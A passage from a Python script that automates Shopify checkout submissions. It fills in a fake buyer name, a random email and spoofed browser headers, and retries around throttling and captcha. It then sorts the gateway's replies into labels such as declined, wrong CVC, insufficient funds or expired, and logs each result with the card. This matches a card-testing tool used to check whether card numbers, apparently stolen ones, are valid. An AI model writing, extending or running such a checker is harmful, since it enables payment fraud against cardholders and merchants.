__typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}',
            'variables': {
                'input': {
                    'sessionInput': {
                        'sessionToken': x_checkout_one_session_token,
                    },
                    'queueToken': queue_token,
                    'discounts': {
                        'lines': [],
                        'acceptUnexpectedDiscounts': True,
                    },
                    'delivery': {
                        'deliveryLines': [
                            {
                                'destination': {
                                    'streetAddress': {
                                        'address1': addr["address1"],
                                        'city': addr["city"],
                                        'countryCode': addr["countryCode"],
                                        'postalCode': addr["postalCode"],
                                        'firstName': 'Laka',
                                        'lastName': 'Lama',
                                        'zoneCode': addr["zoneCode"],
                                        'phone': addr["phone"],
                                        'oneTimeUse': False,
                                    },
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyByHandle': {
                                        'handle': handle,
                                        'customDeliveryRate': False,
                                    },
                                    # 'deliveryStrategyMatchingConditions': {
                                    #     'estimatedTimeInTransit': {
                                    #         'any': True,
                                    #     },
                                    #     'shipments': {
                                    #         'any': True,
                                    #     },
                                    # },
                                    'options': {
                                        'phone': '12195154586',
                                    },
                                },
                                'targetMerchandiseLines': {
                                    'lines': [
                                        {
                                            'stableId': stable_id,
                                        },
                                    ],
                                },
                                'deliveryMethodTypes': [
                                    f'{DMT}',
                                ],
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': f'{amount}',
                                        'currencyCode': f'{addr["currencyCode"]}',
                                    },
                                },
                                'destinationChanged': False,
                            },
                        ],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': [],
                    },
                    'merchandise': {
                        'merchandiseLines': [
                            {
                                'stableId': stable_id,
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                        'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None,
                                    },
                                },
                                'quantity': {
                                    'items': {
                                        'value': 1,
                                    },
                                },
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': f'{price}',
                                        'currencyCode': f'{addr["currencyCode"]}',
                                    },
                                },
                                'lineComponentsSource': None,
                                'lineComponents': [],
                            },
                        ],
                    },
                    'memberships': {
                        'memberships': [],
                    },
                    'payment': {
                        'totalAmount': {
                            'any': True,
                        },
                        'paymentLines': [
                            {
                                'paymentMethod': {
                                    'directPaymentMethod': {
                                        'paymentMethodIdentifier': paymentMethodIdentifier,
                                        'sessionId': sessionid,
                                        'billingAddress': {
                                            'streetAddress': {
                                                'address1': addr["address1"],
                                                'city': addr["city"],
                                                'countryCode': addr["countryCode"],
                                                'postalCode': addr["postalCode"],
                                                'firstName': 'Laka',
                                                'lastName': 'Lama',
                                                'zoneCode': addr["zoneCode"],
                                                'phone': addr["phone"],
                                            },
                                        },
                                        'cardSource': None,
                                    },
                                    'giftCardPaymentMethod': None,
                                    'redeemablePaymentMethod': None,
                                    'walletPaymentMethod': None,
                                    'walletsPlatformPaymentMethod': None,
                                    'localPaymentMethod': None,
                                    'paymentOnDeliveryMethod': None,
                                    'paymentOnDeliveryMethod2': None,
                                    'manualPaymentMethod': None,
                                    'customPaymentMethod': None,
                                    'offsitePaymentMethod': None,
                                    'customOnsitePaymentMethod': None,
                                    'deferredPaymentMethod': None,
                                    'customerCreditCardPaymentMethod': None,
                                    'paypalBillingAgreementPaymentMethod': None,
                                },
                                'amount': {
                                    'value': {
                                        'amount': f'{total}',
                                        'currencyCode': f'{addr["currencyCode"]}',
                                    },
                                },
                            },
                        ],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': addr["address1"],
                                'city': addr["city"],
                                'countryCode': addr["countryCode"],
                                'postalCode': addr["postalCode"],
                                'firstName': 'Laka',
                                'lastName': 'Lama',
                                'zoneCode': addr["zoneCode"],
                                'phone': addr["phone"],
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': f'{addr["currencyCode"]}',
                            'countryCode': f'{countryCode}',
                        },
                        'email': f"gmail{__import__('random').randint(100000,999999)}@gmail.com",
                        'emailChanged': False,
                        'phoneCountryCode': f'{countryCode}',
                        'marketingConsent': [],
                        'shopPayOptInPhone': {
                            'countryCode': f'{countryCode}',
                        },
                        'rememberMe': False,
                    },
                    'tip': {
                        'tipLines': [],
                    },
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {
                                'amount': f'{tax3}',
                                'currencyCode': f'{addr["currencyCode"]}',
                            },
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {
                        'message': None,
                        'customAttributes': [],
                    },
                    'localizationExtension': {
                        'fields': [],
                    },
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {
                        'buyerRefusesDuties': False,
                    },
                    'captcha': None,
                    'cartMetafields': [],
                },
                'attemptToken': f'{token}-4j33p1vmcd5',
                'metafields': [],
                'analytics': {
                    'requestUrl': checkout_url,
                    'pageId': '0cde623b-7B13-4911-E150-61A3736179ED',
                },
            },
            'operationName': 'SubmitForCompletion',
        }

        if DMT == 'NONE':
            selected_json_data = json_data
        else:
            selected_json_data = sjson_data

        for _sfc_attempt in range(6):
            # Removed tokenization
            request = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=selected_json_data, timeout=22)
            sfc_sc = getattr(request, "status_code", 0)
            if sfc_sc == 200 and "success" in (request.text or ""):
                break
            if sfc_sc in (429, 502, 503, 504) and _sfc_attempt < 5:
                backoff = 2.0 + _sfc_attempt * 1.0 if sfc_sc == 429 else 1.0 + _sfc_attempt * 0.7
                await asyncio.sleep(backoff)
                continue
            try:
                if not hasattr(request, 'json'):
                    continue
                js = request.json()
                if not js or not isinstance(js, dict):
                    continue
                sfc = js.get("data", {}).get("submitForCompletion") or {}
                if sfc.get("__typename") == "Throttled":
                    poll_ms = sfc.get("pollAfter") or 1500
                    await asyncio.sleep(min(float(poll_ms) / 1000.0, 4.0))
                    continue
            except (json.JSONDecodeError, TypeError, AttributeError, Exception):
                pass
            if sfc_sc == 200:
                break
            break

        if sfc_sc not in (200,) and sfc_sc >= 400:
            output.update({
                "Response": f"SUBMIT_HTTP_{sfc_sc}",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output

        if "TAX_NEW_TAX_VALUE_MUST_BE_ACCEPTED" in (request.text or ""):
            output.update({
                "Response": "TAX ⚠️",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output

        request_text_safe = (request.text or "") if request and hasattr(request, 'text') else ""
        
        if "CAPTCHA_METADATA_MISSING" in request_text_safe:
            output.update({
                "Response": "HCAPTCHA DETECTED ⚠️",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output

        if "PAYMENTS_CREDIT_CARD_BASE_EXPIRED" in request_text_safe:
            output.update({
                "Response": "CARD_EXPIRED ⚠️",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output

        if "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED" in request_text_safe:
            output.update({
                "Response": "CARD_NOT_SUPPORTED ⚠️",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output  

        if "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT" in request_text_safe:
            output.update({
                "Response": "INVALID_NUMBER ⚠️",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output  

        # Parse submit response with error handling
        if not request or not hasattr(request, 'text'):
            output.update({
                "Response": "SUBMIT_NO_RESPONSE",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output
        
        try:
            # Check for HTML/captcha
            response_text = (request.text or "") if hasattr(request, 'text') else ""
            if response_text and response_text.strip().startswith("<"):
                if any(x in response_text.lower() for x in ["captcha", "hcaptcha", "recaptcha"]):
                    output.update({
                        "Response": "HCAPTCHA_DETECTED",
                        "Status": False,
                        "Gateway": gateway,
                        "Price": total,
                    })
                    _log_output_to_terminal(output)
                    return output
            
            if not hasattr(request, 'json'):
                output.update({
                    "Response": "SUBMIT_NO_JSON_METHOD",
                    "Status": False,
                    "Gateway": gateway,
                    "Price": total,
                })
                _log_output_to_terminal(output)
                return output
            
            jsun = request.json()
            if not jsun or not isinstance(jsun, dict):
                output.update({
                    "Response": "SUBMIT_INVALID_JSON",
                    "Status": False,
                    "Gateway": gateway,
                    "Price": total,
                })
                _log_output_to_terminal(output)
                return output
        except (json.JSONDecodeError, TypeError, AttributeError):
            output.update({
                "Response": "SUBMIT_INVALID_JSON",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output
        
        sfc = jsun.get("data", {}).get("submitForCompletion") or {}
        sfc_typename = sfc.get("__typename") or ""

        # SubmitFailed: reason string (e.g. PAYMENT_FAILED, CAPTCHA_REQUIRED)
        if sfc_typename == "SubmitFailed":
            reason = (sfc.get("reason") or "SUBMIT_FAILED").strip()
            resp = "CARD_DECLINED"
            if "CAPTCHA" in reason.upper():
                resp = "CAPTCHA_REQUIRED"
            elif "PAYMENT" in reason.upper() or "DECLINED" in reason.upper():
                resp = "CARD_DECLINED"
            elif "NUMBER" in reason.upper() or "INVALID" in reason.upper():
                resp = "INCORRECT_NUMBER"
            elif "CVC" in reason.upper() or "CVV" in reason.upper():
                resp = "INCORRECT_CVC"
            elif "EXPIRED" in reason.upper():
                resp = "CARD_EXPIRED"
            elif "FRAUD" in reason.upper():
                resp = "FRAUD_SUSPECTED"
            elif "FUNDS" in reason.upper():
                resp = "INSUFFICIENT_FUNDS"
            elif "AUTHENTICATION" in reason.upper():
                resp = "AUTHENTICATION_FAILED"
            else:
                resp = reason or "SUBMIT_FAILED"
            output.update({
                "Response": resp,
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
            })
            _log_output_to_terminal(output)
            return output

        # SubmitRejected: errors list with code/localizedMessage
        if sfc_typename == "SubmitRejected":
            errors = sfc.get("errors") or []
            resp = "CARD_DECLINED"
            if errors and isinstance(errors, list):
                err = errors[0] if isinstance(errors[0], dict) else {}
                code = (err.get("code") or err.get("nonLocalizedMessage") or err.get("localizedMessage") or "").strip()
                if "CAPTCHA" in code.upper():
                    resp = "CAPTCHA_REQUIRED"
                elif "PAYMENT" in code.upper() or "DECLINED" in code.upper():
                    resp = "CARD_DECLINED"
                elif "NUMBER" in code.upper() or "INVALID" in code.upper():
                    resp = "INCORRECT_NUMBER"
                elif "CVC" in code.upper() or "CVV" in code.upper():
                    resp = "INCORRECT_CVC"
                elif "EXPIRED" in code.upper():
                    resp = "CARD_EXPIRED"
                elif "FRAUD" in code.upper():
                    resp = "FRAUD_SUSPECTED"
                elif "FUNDS" in code.upper():
                    resp = "INSUFFICIENT_FUNDS"
                elif "AUTHENTICATION" in code.upper():
                    resp = "AUTHENTICATION_FAILED"
                elif code:
                    resp = code
            output.update({
                "Response": resp,
                "Status": True,
                "Gateway": gateway,
                "Price": total,
                "cc": card,
            })
            _log_output_to_terminal(output)
            return output

        receipt = sfc.get("receipt") or {}
        receipt_id = receipt.get("id")
        if not receipt_id:
            await asyncio.sleep(1.0)
            try:
                # Removed tokenization
                req2 = await session.post(f'{url}/checkouts/internal/graphql/persisted', params=params, headers=headers, json=selected_json_data, timeout=22)
                if req2 and hasattr(req2, 'json'):
                    js2 = req2.json()
                    if js2 and isinstance(js2, dict):
                        sfc2 = js2.get("data", {}).get("submitForCompletion") or {}
                        receipt = sfc2.get("receipt") or {}
                        receipt_id = receipt.get("id")
            except (json.JSONDecodeError, TypeError, AttributeError, Exception):
                pass
        if not receipt_id:
            output.update({
                "Response": "RECEIPT_EMPTY",
                "Status": False,
                "Gateway": gateway,
                "Price": total,
            })
            _log_output_to_terminal(output)
            return output

        await asyncio.sleep(0.5)
        headers = {
            'authority': domain,
            'accept': 'application/json',
            'accept-language': 'en-US',
            'content-type': 'application/json',
            'origin': url,
            'referer': url,
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': f'{mobile}',
            'sec-ch-ua-platform': f'"{clienthint}"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'shopify-checkout-client': 'checkout-web/1.0',
            'user-agent': f'{getua}',
            'x-checkout-one-session-token': x_checkout_one_session_token,
            'x-checkout-web-build-id': web_build,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': token
        }

        params = {
            'operationName': 'PollForReceipt',
        }

        json_data = {
